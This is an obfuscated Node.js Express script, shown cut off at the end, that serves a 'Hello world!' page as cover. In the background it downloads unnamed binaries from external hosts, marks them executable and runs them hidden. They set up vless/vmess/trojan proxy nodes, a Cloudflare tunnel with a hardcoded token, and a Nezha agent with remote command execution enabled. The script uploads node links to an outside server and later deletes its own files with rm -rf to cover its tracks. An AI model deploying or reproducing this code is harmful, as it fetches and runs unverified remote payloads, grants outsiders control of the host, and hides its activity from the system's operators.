const _0x2a1465=_0x3bbb;(function(_0x150ec1,_0x51d008){const _0x5a2d05=_0x3bbb,_0x5cebcb=_0x150ec1();while(!![]){try{const _0x4d195e=-parseInt(_0x5a2d05(0x140))/0x1*(parseInt(_0x5a2d05(0xe0))/0x2)+-parseInt(_0x5a2d05(0x102))/0x3+parseInt(_0x5a2d05(0x183))/0x4*(-parseInt(_0x5a2d05(0xed))/0x5)+parseInt(_0x5a2d05(0xf2))/0x6+parseInt(_0x5a2d05(0x15a))/0x7+parseInt(_0x5a2d05(0x165))/0x8*(parseInt(_0x5a2d05(0x122))/0x9)+parseInt(_0x5a2d05(0x12b))/0xa;if(_0x4d195e===_0x51d008)break;else _0x5cebcb['push'](_0x5cebcb['shift']());}catch(_0x3e2f9d){_0x5cebcb['push'](_0x5cebcb['shift']());}}}(_0x9cc7,0x33ee9));const express=require('express'),app=express(),axios=require(_0x2a1465(0x101)),os=require('os'),fs=require('fs'),path=require(_0x2a1465(0x119)),{promisify}=require(_0x2a1465(0x14a)),exec=promisify(require(_0x2a1465(0x11a))[_0x2a1465(0x133)]),{execSync}=require(_0x2a1465(0x11a)),UPLOAD_URL=process[_0x2a1465(0x16d)][_0x2a1465(0xf9)]||'',PROJECT_URL=process['env'][_0x2a1465(0xe4)]||'',AUTO_ACCESS=process[_0x2a1465(0x16d)]['AUTO_ACCESS']||![],FILE_PATH=process[_0x2a1465(0x16d)][_0x2a1465(0x18c)]||_0x2a1465(0xfd),SUB_PATH=process[_0x2a1465(0x16d)][_0x2a1465(0x104)]||_0x2a1465(0x16b),PORT=process['env'][_0x2a1465(0xf1)]||process[_0x2a1465(0x16d)][_0x2a1465(0x132)]||0xbb8,UUID=process[_0x2a1465(0x16d)][_0x2a1465(0x173)]||'946af138-4117-45aa-9251-a8a8ef7367ac',NEZHA_SERVER=process[_0x2a1465(0x16d)]['NEZHA_SERVER']||'',NEZHA_PORT=process['env'][_0x2a1465(0x152)]||'',NEZHA_KEY=process[_0x2a1465(0x16d)][_0x2a1465(0xfe)]||'',ARGO_DOMAIN=process[_0x2a1465(0x16d)][_0x2a1465(0x155)]||_0x2a1465(0x16a),ARGO_AUTH=process[_0x2a1465(0x16d)][_0x2a1465(0x163)]||_0x2a1465(0x125),ARGO_PORT=process[_0x2a1465(0x16d)][_0x2a1465(0xe6)]||0x1f41,CFIP=process['env'][_0x2a1465(0x127)]||_0x2a1465(0x170),CFPORT=process['env']['CFPORT']||0x1bb,NAME=process[_0x2a1465(0x16d)]['NAME']||'';function _0x3bbb(_0x5b3b62,_0x367cfe){_0x5b3b62=_0x5b3b62-0xd4;const _0x9cc789=_0x9cc7();let _0x3bbb0a=_0x9cc789[_0x5b3b62];return _0x3bbb0a;}!fs['existsSync'](FILE_PATH)?(fs['mkdirSync'](FILE_PATH),console[_0x2a1465(0x112)](FILE_PATH+'\x20is\x20created')):console[_0x2a1465(0x112)](FILE_PATH+_0x2a1465(0x17a));function generateRandomName(){const _0x5b3b4e=_0x2a1465,_0x36ff34='abcdefghijklmnopqrstuvwxyz';let _0x1c9537='';for(let _0xc26213=0x0;_0xc26213<0x6;_0xc26213++){_0x1c9537+=_0x36ff34['charAt'](Math[_0x5b3b4e(0x13a)](Math[_0x5b3b4e(0x18f)]()*_0x36ff34[_0x5b3b4e(0xe7)]));}return _0x1c9537;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x2a1465(0xfc)](FILE_PATH,npmName),phpPath=path[_0x2a1465(0xfc)](FILE_PATH,phpName),webPath=path[_0x2a1465(0xfc)](FILE_PATH,webName),botPath=path[_0x2a1465(0xfc)](FILE_PATH,botName),subPath=path['join'](FILE_PATH,_0x2a1465(0xe3)),listPath=path[_0x2a1465(0xfc)](FILE_PATH,'list.txt'),bootLogPath=path[_0x2a1465(0xfc)](FILE_PATH,_0x2a1465(0xec)),configPath=path[_0x2a1465(0xfc)](FILE_PATH,'config.json');function deleteNodes(){const _0xe6a2e=_0x2a1465;try{if(!UPLOAD_URL)return;if(!fs[_0xe6a2e(0x146)](subPath))return;let _0x5823f9;try{_0x5823f9=fs[_0xe6a2e(0x14c)](subPath,_0xe6a2e(0x15f));}catch{return null;}const _0x2bfb6a=Buffer[_0xe6a2e(0xf8)](_0x5823f9,_0xe6a2e(0x192))['toString']('utf-8'),_0x2faf7e=_0x2bfb6a[_0xe6a2e(0xd5)]('\x0a')[_0xe6a2e(0x11f)](_0x2ab421=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0xe6a2e(0x153)](_0x2ab421));if(_0x2faf7e[_0xe6a2e(0xe7)]===0x0)return;return axios[_0xe6a2e(0xee)](UPLOAD_URL+'/api/delete-nodes',JSON[_0xe6a2e(0x191)]({'nodes':_0x2faf7e}),{'headers':{'Content-Type':_0xe6a2e(0x12c)}})[_0xe6a2e(0x109)](_0x429baf=>{return null;}),null;}catch(_0x490edf){return null;}}function cleanupOldFiles(){const _0xb396ad=_0x2a1465;try{const _0x378497=fs['readdirSync'](FILE_PATH);_0x378497[_0xb396ad(0x117)](_0x2e23a3=>{const _0xbb4a72=_0xb396ad,_0x1d744c=path[_0xbb4a72(0xfc)](FILE_PATH,_0x2e23a3);try{const _0x2839a8=fs[_0xbb4a72(0x124)](_0x1d744c);_0x2839a8['isFile']()&&fs[_0xbb4a72(0x186)](_0x1d744c);}catch(_0x57c3a2){}});}catch(_0x24f45b){}}app['get']('/',function(_0x557152,_0x72f06c){const _0x2f3fbc=_0x2a1465;_0x72f06c[_0x2f3fbc(0x13e)](_0x2f3fbc(0x141));});async function generateConfig(){const _0x4a55af=_0x2a1465,_0x37e094={'log':{'access':_0x4a55af(0x161),'error':_0x4a55af(0x161),'loglevel':_0x4a55af(0x15b)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x4a55af(0xff),'settings':{'clients':[{'id':UUID,'flow':'xtls-rprx-vision'}],'decryption':'none','fallbacks':[{'dest':0xbb9},{'path':'/vless-argo','dest':0xbba},{'path':'/vmess-argo','dest':0xbbb},{'path':_0x4a55af(0x134),'dest':0xbbc}]},'streamSettings':{'network':_0x4a55af(0xf3)}},{'port':0xbb9,'listen':_0x4a55af(0x105),'protocol':_0x4a55af(0xff),'settings':{'clients':[{'id':UUID}],'decryption':_0x4a55af(0x15b)},'streamSettings':{'network':_0x4a55af(0xf3),'security':_0x4a55af(0x15b)}},{'port':0xbba,'listen':_0x4a55af(0x105),'protocol':_0x4a55af(0xff),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x4a55af(0x15b)},'streamSettings':{'network':'ws','security':_0x4a55af(0x15b),'wsSettings':{'path':_0x4a55af(0x12d)}},'sniffing':{'enabled':!![],'destOverride':[_0x4a55af(0x162),_0x4a55af(0xdb),'quic'],'metadataOnly':![]}},{'port':0xbbb,'listen':'127.0.0.1','protocol':_0x4a55af(0x16f),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':'/vmess-argo'}},'sniffing':{'enabled':!![],'destOverride':['http','tls',_0x4a55af(0xf6)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x4a55af(0x105),'protocol':_0x4a55af(0x10f),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x4a55af(0x15b),'wsSettings':{'path':_0x4a55af(0x134)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x4a55af(0xdb),'quic'],'metadataOnly':![]}}],'dns':{'servers':[_0x4a55af(0x14d)]},'outbounds':[{'protocol':_0x4a55af(0xdf),'tag':_0x4a55af(0x126)},{'protocol':_0x4a55af(0x12a),'tag':'block'}]};fs[_0x4a55af(0x15e)](path[_0x4a55af(0xfc)](FILE_PATH,_0x4a55af(0x142)),JSON[_0x4a55af(0x191)](_0x37e094,null,0x2));}function getSystemArchitecture(){const _0x1efde6=_0x2a1465,_0x2e2345=os['arch']();return _0x2e2345==='arm'||_0x2e2345===_0x1efde6(0xf5)||_0x2e2345===_0x1efde6(0xe5)?_0x1efde6(0x154):_0x1efde6(0x12e);}function downloadFile(_0x2f01ef,_0x1d209e,_0x3c0e02){const _0x5eaeb7=_0x2a1465,_0xdae415=_0x2f01ef;!fs['existsSync'](FILE_PATH)&&fs[_0x5eaeb7(0x103)](FILE_PATH,{'recursive':!![]});const _0x5804b2=fs[_0x5eaeb7(0x13b)](_0xdae415);axios({'method':_0x5eaeb7(0x18d),'url':_0x1d209e,'responseType':'stream'})[_0x5eaeb7(0x17f)](_0x208542=>{const _0x10a712=_0x5eaeb7;_0x208542[_0x10a712(0x11c)]['pipe'](_0x5804b2),_0x5804b2['on'](_0x10a712(0x18e),()=>{const _0x1fcb4d=_0x10a712;_0x5804b2[_0x1fcb4d(0x164)](),console['log'](_0x1fcb4d(0xda)+path[_0x1fcb4d(0x145)](_0xdae415)+_0x1fcb4d(0x131)),_0x3c0e02(null,_0xdae415);}),_0x5804b2['on']('error',_0x5c0bb7=>{const _0x272f3a=_0x10a712;fs[_0x272f3a(0x17c)](_0xdae415,()=>{});const _0x44ccfa=_0x272f3a(0xda)+path[_0x272f3a(0x145)](_0xdae415)+_0x272f3a(0x17d)+_0x5c0bb7['message'];console[_0x272f3a(0x169)](_0x44ccfa),_0x3c0e02(_0x44ccfa);});})[_0x5eaeb7(0x109)](_0x17c9c5=>{const _0xc3bc33=_0x5eaeb7,_0x2c417c=_0xc3bc33(0xda)+path[_0xc3bc33(0x145)](_0xdae415)+'\x20failed:\x20'+_0x17c9c5['message'];console[_0xc3bc33(0x169)](_0x2c417c),_0x3c0e02(_0x2c417c);});}function _0x9cc7(){const _0x442c95=['2083','country_code','boot.log','521005EcOOyg','post','/api/add-nodes','https://arm64.ssss.nyc.mn/agent','SERVER_PORT','331776uVGewY','tcp','substring','arm64','quic','https://amd64.ssss.nyc.mn/v1','from','UPLOAD_URL','Error\x20downloading\x20files:','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','join','./tmp','NEZHA_KEY','vless','Empowerment\x20success\x20for\x20','axios','1227954YlLJvG','mkdirSync','SUB_PATH','127.0.0.1','automatic\x20access\x20task\x20added\x20successfully','http://ip-api.com/json/','https://arm64.ssss.nyc.mn/web','catch','?security=tls&sni=','pkill\x20-f\x20\x22[','status','https://oooo.serv00.net/add-url','match','trojan','\x20>/dev/null\x202>&1','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','log','\x0a\x20\x20\x20\x20','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','/config.json\x20>/dev/null\x202>&1\x20&','forEach','unshift','path','child_process','php\x20running\x20error:\x20','data','2096','message','filter','success','\x0a\x0atrojan://','162skgOXy','pop','statSync','eyJhIjoiYzE0Zjc3MmVkNTU5YWRmNGZkMWEyNzRmMWE2YTc1ZmEiLCJ0IjoiZGIzY2Q5MDQtZWYxNy00OWM2LTgxNzUtNTZkYjQ0ZGVlZDJlIiwicyI6Ik1UaGxNVFl5WTJZdE5qTTNNQzAwTldRM0xUZ3lZemt0Tm1VM05qTTFNR1l4TldOaSJ9','direct','CFIP','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','Content-Type','blackhole','8823370HRuiMs','application/json','/vless-argo','amd','toString','fileName','\x20successfully','PORT','exec','/trojan-argo','Error\x20in\x20startserver:','https://amd64.ssss.nyc.mn/bot','8443','https://amd64.ssss.nyc.mn/agent','includes','floor','createWriteStream','rm\x20-rf\x20','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','send','response','77Vwaufk','Hello\x20world!','config.json','org','set','basename','existsSync','Skipping\x20adding\x20automatic\x20access\x20task','NEZHA\x20variable\x20is\x20empty,skip\x20running','Error\x20executing\x20command:\x20','util','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','readFileSync','https+local://8.8.8.8/dns-query','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','map','Subscription\x20uploaded\x20successfully','npm\x20running\x20error:\x20','NEZHA_PORT','test','arm','ARGO_DOMAIN','\x22\x20>\x20/dev/null\x202>&1','&fp=firefox&type=ws&host=','/sub.txt\x20saved\x20successfully','https://amd64.ssss.nyc.mn/web','1056097dKVlGF','none','has','/tunnel.yml\x20run','writeFileSync','utf-8','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','/dev/null','http','ARGO_AUTH','close','54736QXiAAm','fileUrl','\x20>/dev/null\x202>&1\x20&','nohup\x20','error','railway.ggez.bid','sub','del\x20/f\x20/q\x20','env','Error\x20reading\x20boot.log:','vmess','cmcmcm.cf.090227.xyz','tunnel.json','\x0aclient_secret:\x20','UUID','win32','http\x20server\x20is\x20running\x20on\x20port:','taskkill\x20/f\x20/im\x20','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','\x20>\x20nul\x202>&1','\x20already\x20exists','countryCode','unlink','\x20failed:\x20','tunnel.yml','then','443','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','App\x20is\x20running','8LTUTqe','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','TunnelSecret','unlinkSync','--tls','clear','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','2053','ARGO_DOMAIN:','FILE_PATH','get','finish','random','config.yaml','stringify','base64','\x0a\x20\x20credentials-file:\x20','\x0avless://','Nodes\x20uploaded\x20successfully','2087','split','platform','push','\x20-c\x20\x22','ArgoDomain:','Download\x20','tls','&path=%2Fvless-argo%3Fed%3D2560#','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','Unhandled\x20error\x20in\x20startserver:','freedom','9902wONFEJ','charAt','\x20is\x20running','sub.txt','PROJECT_URL','aarch64','ARGO_PORT','length','firefox','\x20-p\x20'];_0x9cc7=function(){return _0x442c95;};return _0x9cc7();}async function downloadFilesAndRun(){const _0x14386d=_0x2a1465,_0x166fc7=getSystemArchitecture(),_0x2a42e5=getFilesForArchitecture(_0x166fc7);if(_0x2a42e5[_0x14386d(0xe7)]===0x0){console[_0x14386d(0x112)](_0x14386d(0x128));return;}const _0x5ccc7e=_0x2a42e5[_0x14386d(0x14f)](_0x5d2a36=>{return new Promise((_0x1bcd47,_0x1155dc)=>{const _0x2f050c=_0x3bbb;downloadFile(_0x5d2a36[_0x2f050c(0x130)],_0x5d2a36[_0x2f050c(0x166)],(_0x455033,_0x58680d)=>{_0x455033?_0x1155dc(_0x455033):_0x1bcd47(_0x58680d);});});});try{await Promise['all'](_0x5ccc7e);}catch(_0x2d6089){console[_0x14386d(0x169)](_0x14386d(0xfa),_0x2d6089);return;}function _0x5d1e94(_0x465903){const _0x5015e2=_0x14386d,_0x5bf7fa=0x1fd;_0x465903[_0x5015e2(0x117)](_0xb7b0ed=>{const _0x3a25a2=_0x5015e2;fs[_0x3a25a2(0x146)](_0xb7b0ed)&&fs['chmod'](_0xb7b0ed,_0x5bf7fa,_0x5e35cf=>{const _0x5da1c2=_0x3a25a2;_0x5e35cf?console[_0x5da1c2(0x169)]('Empowerment\x20failed\x20for\x20'+_0xb7b0ed+':\x20'+_0x5e35cf):console[_0x5da1c2(0x112)](_0x5da1c2(0x100)+_0xb7b0ed+':\x20'+_0x5bf7fa[_0x5da1c2(0x12f)](0x8));});});}const _0x57a676=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x5d1e94(_0x57a676);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x14d37d=NEZHA_SERVER['includes'](':')?NEZHA_SERVER[_0x14386d(0xd5)](':')[_0x14386d(0x123)]():'',_0x409297=new Set([_0x14386d(0x180),_0x14386d(0x137),'2096',_0x14386d(0xd4),_0x14386d(0xea),_0x14386d(0x18a)]),_0xc61fc1=_0x409297[_0x14386d(0x15c)](_0x14d37d)?'true':'false',_0x215cc9=_0x14386d(0x172)+NEZHA_KEY+_0x14386d(0x177)+NEZHA_SERVER+_0x14386d(0x181)+_0xc61fc1+_0x14386d(0x160)+UUID;fs[_0x14386d(0x15e)](path['join'](FILE_PATH,_0x14386d(0x190)),_0x215cc9);const _0x57cca2='nohup\x20'+phpPath+_0x14386d(0xd8)+FILE_PATH+_0x14386d(0x189);try{await exec(_0x57cca2),console[_0x14386d(0x112)](phpName+_0x14386d(0xe2)),await new Promise(_0x381867=>setTimeout(_0x381867,0x3e8));}catch(_0x4ef7bb){console['error'](_0x14386d(0x11b)+_0x4ef7bb);}}else{let _0x2d49ee='';const _0x529cfd=[_0x14386d(0x180),_0x14386d(0x137),_0x14386d(0x11d),_0x14386d(0xd4),'2083',_0x14386d(0x18a)];_0x529cfd[_0x14386d(0x139)](NEZHA_PORT)&&(_0x2d49ee=_0x14386d(0x187));const _0x2ef3d9='nohup\x20'+npmPath+'\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+_0x14386d(0xe9)+NEZHA_KEY+'\x20'+_0x2d49ee+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';try{await exec(_0x2ef3d9),console[_0x14386d(0x112)](npmName+_0x14386d(0xe2)),await new Promise(_0x457d5e=>setTimeout(_0x457d5e,0x3e8));}catch(_0x39dd92){console[_0x14386d(0x169)](_0x14386d(0x151)+_0x39dd92);}}}else console[_0x14386d(0x112)](_0x14386d(0x148));const _0x5aa575=_0x14386d(0x168)+webPath+'\x20-c\x20'+FILE_PATH+_0x14386d(0x116);try{await exec(_0x5aa575),console['log'](webName+'\x20is\x20running'),await new Promise(_0x2dba18=>setTimeout(_0x2dba18,0x3e8));}catch(_0x442e38){console[_0x14386d(0x169)]('web\x20running\x20error:\x20'+_0x442e38);}if(fs[_0x14386d(0x146)](botPath)){let _0x51d3d4;if(ARGO_AUTH[_0x14386d(0x10e)](/^[A-Z0-9a-z=]{120,250}$/))_0x51d3d4=_0x14386d(0x184)+ARGO_AUTH;else ARGO_AUTH['match'](/TunnelSecret/)?_0x51d3d4=_0x14386d(0x178)+FILE_PATH+_0x14386d(0x15d):_0x51d3d4=_0x14386d(0x115)+FILE_PATH+_0x14386d(0x14e)+ARGO_PORT;try{await exec(_0x14386d(0x168)+botPath+'\x20'+_0x51d3d4+_0x14386d(0x167)),console['log'](botName+'\x20is\x20running'),await new Promise(_0x48ca78=>setTimeout(_0x48ca78,0x7d0));}catch(_0x2bae7a){console[_0x14386d(0x169)](_0x14386d(0x149)+_0x2bae7a);}}await new Promise(_0x4aa745=>setTimeout(_0x4aa745,0x1388));}function getFilesForArchitecture(_0x7bae45){const _0x533b06=_0x2a1465;let _0x803e18;_0x7bae45===_0x533b06(0x154)?_0x803e18=[{'fileName':webPath,'fileUrl':_0x533b06(0x108)},{'fileName':botPath,'fileUrl':'https://arm64.ssss.nyc.mn/bot'}]:_0x803e18=[{'fileName':webPath,'fileUrl':_0x533b06(0x159)},{'fileName':botPath,'fileUrl':_0x533b06(0x136)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x41eba5=_0x7bae45===_0x533b06(0x154)?_0x533b06(0xf0):_0x533b06(0x138);_0x803e18[_0x533b06(0x118)]({'fileName':npmPath,'fileUrl':_0x41eba5});}else{const _0x30ff25=_0x7bae45==='arm'?'https://arm64.ssss.nyc.mn/v1':_0x533b06(0xf7);_0x803e18[_0x533b06(0x118)]({'fileName':phpPath,'fileUrl':_0x30ff25});}}return _0x803e18;}function argoType(){const _0x3cda20=_0x2a1465;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x3cda20(0x112)]('ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels');return;}if(ARGO_AUTH[_0x3cda20(0x139)](_0x3cda20(0x185))){fs[_0x3cda20(0x15e)](path[_0x3cda20(0xfc)](FILE_PATH,'tunnel.json'),ARGO_AUTH);const _0x485e22='\x0a\x20\x20tunnel:\x20'+ARGO_AUTH[_0x3cda20(0xd5)]('\x22')[0xb]+_0x3cda20(0x193)+path[_0x3cda20(0xfc)](FILE_PATH,_0x3cda20(0x171))+_0x3cda20(0xdd)+ARGO_DOMAIN+_0x3cda20(0x14b)+ARGO_PORT+_0x3cda20(0xfb);fs[_0x3cda20(0x15e)](path[_0x3cda20(0xfc)](FILE_PATH,_0x3cda20(0x17e)),_0x485e22);}else console[_0x3cda20(0x112)](_0x3cda20(0x114));}async function extractDomains(){const _0x487342=_0x2a1465;let _0x4892d1;if(ARGO_AUTH&&ARGO_DOMAIN)_0x4892d1=ARGO_DOMAIN,console[_0x487342(0x112)](_0x487342(0x18b),_0x4892d1),await _0x2983ed(_0x4892d1);else try{const _0x25d33f=fs[_0x487342(0x14c)](path[_0x487342(0xfc)](FILE_PATH,'boot.log'),_0x487342(0x15f)),_0x165201=_0x25d33f[_0x487342(0xd5)]('\x0a'),_0x4f1eea=[];_0x165201[_0x487342(0x117)](_0x3448da=>{const _0x562889=_0x487342,_0xd38c20=_0x3448da[_0x562889(0x10e)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0xd38c20){const _0x5c3518=_0xd38c20[0x1];_0x4f1eea[_0x562889(0xd7)](_0x5c3518);}});if(_0x4f1eea['length']>0x0)_0x4892d1=_0x4f1eea[0x0],console[_0x487342(0x112)](_0x487342(0xd9),_0x4892d1),await _0x2983ed(_0x4892d1);else{console[_0x487342(0x112)](_0x487342(0x13d)),fs[_0x487342(0x186)](path['join'](FILE_PATH,_0x487342(0xec)));async function _0x142993(){const _0xbdbcec=_0x487342;try{process[_0xbdbcec(0xd6)]===_0xbdbcec(0x174)?await exec(_0xbdbcec(0x176)+botName+'.exe\x20>\x20nul\x202>&1'):await exec(_0xbdbcec(0x10b)+botName[_0xbdbcec(0xe1)](0x0)+']'+botName[_0xbdbcec(0xf4)](0x1)+_0xbdbcec(0x156));}catch(_0x605c93){}}_0x142993(),await new Promise(_0x48f44a=>setTimeout(_0x48f44a,0xbb8));const _0x8c0846='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x487342(0x14e)+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x8c0846+_0x487342(0x167)),console[_0x487342(0x112)](botName+_0x487342(0xe2)),await new Promise(_0xb9d7b=>setTimeout(_0xb9d7b,0xbb8)),await extractDomains();}catch(_0x4a29cc){console[_0x487342(0x169)]('Error\x20executing\x20command:\x20'+_0x4a29cc);}}}catch(_0x5a58cd){console[_0x487342(0x169)](_0x487342(0x16e),_0x5a58cd);}async function _0x532561(){const _0x19f13b=_0x487342;try{const _0x3c8c5f=await axios[_0x19f13b(0x18d)]('https://ipapi.co/json/',{'timeout':0xbb8});if(_0x3c8c5f[_0x19f13b(0x11c)]&&_0x3c8c5f['data'][_0x19f13b(0xeb)]&&_0x3c8c5f[_0x19f13b(0x11c)][_0x19f13b(0x143)])return _0x3c8c5f[_0x19f13b(0x11c)][_0x19f13b(0xeb)]+'_'+_0x3c8c5f[_0x19f13b(0x11c)]['org'];}catch(_0x562e7e){try{const _0x51be3e=await axios['get'](_0x19f13b(0x107),{'timeout':0xbb8});if(_0x51be3e[_0x19f13b(0x11c)]&&_0x51be3e[_0x19f13b(0x11c)]['status']===_0x19f13b(0x120)&&_0x51be3e[_0x19f13b(0x11c)]['countryCode']&&_0x51be3e[_0x19f13b(0x11c)][_0x19f13b(0x143)])return _0x51be3e['data'][_0x19f13b(0x17b)]+'_'+_0x51be3e[_0x19f13b(0x11c)][_0x19f13b(0x143)];}catch(_0x174a2d){}}return'Unknown';}async function _0x2983ed(_0x37bd26){const _0x5dc79f=await _0x532561(),_0x1629fb=NAME?NAME+'-'+_0x5dc79f:_0x5dc79f;return new Promise(_0x1dabfa=>{setTimeout(()=>{const _0x21b049=_0x3bbb,_0x1fb3bc={'v':'2','ps':''+_0x1629fb,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x21b049(0x15b),'net':'ws','type':'none','host':_0x37bd26,'path':'/vmess-argo?ed=2560','tls':_0x21b049(0xdb),'sni':_0x37bd26,'alpn':'','fp':_0x21b049(0xe8)},_0x1f084e=_0x21b049(0x194)+UUID+'@'+CFIP+':'+CFPORT+'?encryption=none&security=tls&sni='+_0x37bd26+_0x21b049(0x157)+_0x37bd26+_0x21b049(0xdc)+_0x1629fb+'\x0a\x0avmess://'+Buffer[_0x21b049(0xf8)](JSON[_0x21b049(0x191)](_0x1fb3bc))[_0x21b049(0x12f)]('base64')+_0x21b049(0x121)+UUID+'@'+CFIP+':'+CFPORT+_0x21b049(0x10a)+_0x37bd26+_0x21b049(0x157)+_0x37bd26+'&path=%2Ftrojan-argo%3Fed%3D2560#'+_0x1629fb+_0x21b049(0x113);console[_0x21b049(0x112)](Buffer[_0x21b049(0xf8)](_0x1f084e)[_0x21b049(0x12f)](_0x21b049(0x192))),fs['writeFileSync'](subPath,Buffer[_0x21b049(0xf8)](_0x1f084e)[_0x21b049(0x12f)]('base64')),console[_0x21b049(0x112)](FILE_PATH+_0x21b049(0x158)),uploadNodes(),app[_0x21b049(0x18d)]('/'+SUB_PATH,(_0x2ef021,_0x52a7d4)=>{const _0x17f435=_0x21b049,_0x2bf5b1=Buffer['from'](_0x1f084e)[_0x17f435(0x12f)]('base64');_0x52a7d4[_0x17f435(0x144)](_0x17f435(0x129),'text/plain;\x20charset=utf-8'),_0x52a7d4[_0x17f435(0x13e)](_0x2bf5b1);}),_0x1dabfa(_0x1f084e);},0x7d0);});}}async function uploadNodes(){const _0x47be8a=_0x2a1465;if(UPLOAD_URL&&PROJECT_URL){const _0x376dcd=PROJECT_URL+'/'+SUB_PATH,_0x4a8455={'subscription':[_0x376dcd]};try{const _0x5d6622=await axios[_0x47be8a(0xee)](UPLOAD_URL+'/api/add-subscriptions',_0x4a8455,{'headers':{'Content-Type':_0x47be8a(0x12c)}});return _0x5d6622&&_0x5d6622[_0x47be8a(0x10c)]===0xc8?(console['log'](_0x47be8a(0x150)),_0x5d6622):null;}catch(_0x4db058){if(_0x4db058[_0x47be8a(0x13f)]){if(_0x4db058[_0x47be8a(0x13f)][_0x47be8a(0x10c)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x47be8a(0x146)](listPath))return;const _0x2e23ad=fs[_0x47be8a(0x14c)](listPath,_0x47be8a(0x15f)),_0x547832=_0x2e23ad[_0x47be8a(0xd5)]('\x0a')[_0x47be8a(0x11f)](_0xe650dd=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x47be8a(0x153)](_0xe650dd));if(_0x547832[_0x47be8a(0xe7)]===0x0)return;const _0x1de722=JSON[_0x47be8a(0x191)]({'nodes':_0x547832});try{const _0x389a9c=await axios[_0x47be8a(0xee)](UPLOAD_URL+_0x47be8a(0xef),_0x1de722,{'headers':{'Content-Type':_0x47be8a(0x12c)}});return _0x389a9c&&_0x389a9c[_0x47be8a(0x10c)]===0xc8?(console[_0x47be8a(0x112)](_0x47be8a(0x195)),_0x389a9c):null;}catch(_0x4914b3){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x2ba15d=_0x3bbb,_0x52596c=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x52596c['push'](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x52596c[_0x2ba15d(0xd7)](phpPath);process[_0x2ba15d(0xd6)]===_0x2ba15d(0x174)?exec(_0x2ba15d(0x16c)+_0x52596c[_0x2ba15d(0xfc)]('\x20')+_0x2ba15d(0x179),_0x3c6170=>{const _0x51495e=_0x2ba15d;console[_0x51495e(0x188)](),console['log'](_0x51495e(0x182)),console['log'](_0x51495e(0x111));}):exec(_0x2ba15d(0x13c)+_0x52596c['join']('\x20')+_0x2ba15d(0x110),_0x5f2c6d=>{const _0x3d5cfb=_0x2ba15d;console[_0x3d5cfb(0x188)](),console['log'](_0x3d5cfb(0x182)),console[_0x3d5cfb(0x112)](_0x3d5cfb(0x111));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x2477e3=_0x2a1465;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x2477e3(0x112)](_0x2477e3(0x147));return;}try{const _0x45c579=await axios[_0x2477e3(0xee)](_0x2477e3(0x10d),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x2477e3(0x12c)}});return console['log'](_0x2477e3(0x106)),_0x45c579;}catch(_0x24e034){return console['error']('Add\x20automatic\x20access\x20task\x20faild:\x20'+_0x24e034[_0x2477e3(0x11e)]),null;}}async function startserver(){const _0x3c4722=_0x2a1465;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x44c0af){console[_0x3c4722(0x169)](_0x3c4722(0x135),_0x44c0af);}}startserver()[_0x2a1465(0x109)](_0x3a6252=>{const 